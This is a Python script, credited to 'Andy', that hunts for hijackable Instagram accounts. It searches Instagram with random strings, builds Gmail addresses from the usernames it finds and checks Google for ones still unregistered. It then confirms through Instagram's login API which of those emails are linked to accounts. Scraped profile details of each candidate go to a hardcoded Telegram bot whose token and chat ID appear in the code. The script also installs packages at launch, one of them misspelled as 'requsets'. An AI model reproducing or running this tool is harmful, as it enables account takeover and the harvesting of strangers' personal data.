import os , time , random , string , json
os.system('pip install gdolib==0.3.1')
try:
	import requests , random , gdolib , uuid , pyfiglet
except:
	os.system("pip install requsets")
	os.system("pip install user_agent")
	os.system("pip install datetime")
	os.system("pip install uuid")
	os.system("clear")

def cls():
	os.system('cls' if os.name == 'nt' else 'clear')
cls()	
#-----------[ Colors ]-----------
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
E = "\033[0;90m" #رمادي
#------------------------------[Start CoDe]------------------------------
print(Z+'━'*25)
azooz = f" {X}« {C}Welcome To {X}Andy {C}Tool {X}»"
print(azooz)
print(Z+'━'*25)
def azz():
	Andy = f'''{X}
	
      .d8b.  d8b   db d8888b. db    db
      d8' `8b 888o  88 88  `8D `8b  d8'
      88ooo88 88V8o 88 88   88  `8bd8'
      88~~~88 88 V8o88 88   88    88
      88   88 88  V888 88  .8D    88
      YP   YP VP   V8P Y8888D'    YP


    {C}Script Hunter Emails Coder By Andy
{Z}┏━━━━━━━━━━━━━━━━━┓           
    {C}⌯ Channel {X}›{C} @oyurl   
{Z}┗━━━━━━━━━━━━━━━━━┛               '''
	for azoz in Andy.splitlines():
		time.sleep(0.05)
		print(azoz)

azz()
token = "5339545164:AAGYoWHpe0aEpfWlSnY00dZhCVDqc0i0QYs"
ID = "5336448904"

def cheak(email,user):
	url = 'https://b.i.instagram.com/api/v1/accounts/login/'
	headers = {'User-Agent':str(gdolib.info_IG.Server_IG()),
	'Accept':'*/*',
	'Cookie':'missing',
	'Accept-Encoding':'gzip, deflate',
	'Accept-Language':'en-US',
	'X-IG-Capabilities':'3brTvw==',
	'X-IG-Connection-Type':'WIFI',
	'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
	'Host':'i.instagram.com'}
	data = {'uuid':str(uuid.uuid4()), 
	'password':'oyurl', 
	'username':str(email),
	'device_id':str(uuid.uuid4()), 
	'from_reg':'false', 
	'_csrftoken':'missing', 
	'login_attempt_countn':'0'}
	res = requests.post(url,headers=headers,data=data).text
	if 'The password you entered ' in res:
		headers = {
		'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
		'viewport-width':'412',
		'x-asbd-id':'198387',
		'x-ig-app-id':'1217981644879628',
		'x-ig-www-claim':'hmac.AR1GMxGxYNiyJ_Qr59WPgznfqJKtnAogUcpBr_5hDMSoxwjz'}
		res = requests.get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={user}",headers=headers).json()['data']['user']
		name = res['full_name']
		followers = res['edge_followed_by']['count']
		following = res['edge_follow']['count']
		isp = res['is_private']
		bio = res['biography']
		posts = res['edge_owner_to_timeline_media']['count']
		id = res['id']
		date = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}").json()["data"]
		gdo = f"""
⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ ĞĐØ ⌯
•────────────────•
⌯ ɴᴀᴍᴇ » {name}
⌯ ᴜsᴇʀɴᴀᴍᴇ » @{user}
⌯ ᴇᴍᴀɪʟ » {email}
⌯ ғᴏʟʟᴏᴡᴇʀs » {followers}
⌯ ғᴏʟʟᴏᴡɪɴɢ » {following}
⌯ ᴅᴀᴛᴇ » {date}
⌯ ɪᴅ » {id}
⌯ ᴘᴏsᴛs » {posts}
⌯ ᴘʀɪvᴀᴛᴇ » {isp}
⌯ ʙɪᴏ » {bio}
⌯ 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}
•────────────────•
◔͜͡◔ ʙʏ » @oyurl - @IIlAndylII ."""
		requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="+str(gdo))
		print('\n{gdo}\n')
	else:
		print(f'{X}• BaD Instagram » {email} ')
	 
def check():
 name = str("".join(random.choice(string.ascii_lowercase + string.digits+"_")for i in range(random.randint(8,23))))
 headers = {'accept':'*/*',
	'accept-encoding':'gzip, deflate, br',
	'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	'access-control-request-headers':'x-asbd-id,x-csrftoken,x-ig-app-id,x-ig-www-claim,x-instagram-ajax',
	'access-control-request-method':'GET',
	'origin':'https://www.instagram.com',
	'referes':'https://www.instagram.com/',
	'sec-fetch-dest':'empty',
	'sec-fetch-mode':'cors',
	'sec-fetch-site':'same-site',
	'user-agent':str(gdolib.info_IG.Server_IG())}
 req = requests.get(f"https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={name}&rank_token=0.6481600571666157&include_reel=true",headers=headers).json()
 if req['status'] == "fail":
  exit(f"{Z}\n\n\n • Wait 5 Minutes for unban ...")
 else:
   for us in req["users"]:
   	user = us['user']['username']
   	email = user+"@gmail.com"
   	url = 'https://android.clients.google.com/setup/checkavail'
   	headers = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',}
   	data = {
		'username':str(email),
		'version':'3',
		'firstName':'Andy -',
		'lastName':'Coder'}
   	res = requests.post(url,data=json.dumps(data),headers=headers)
   	if res.json()['status'] == 'SUCCESS':
   		print(f"{X}▩ Goo𝙳 Gmail » {email} ")
   		cheak(email,user)
   	else:
   	 print(f"{Z}▩ 𝙱𝙰𝙳 Gmail » {email} ")
	    

cls();azz()
while True:
	check()
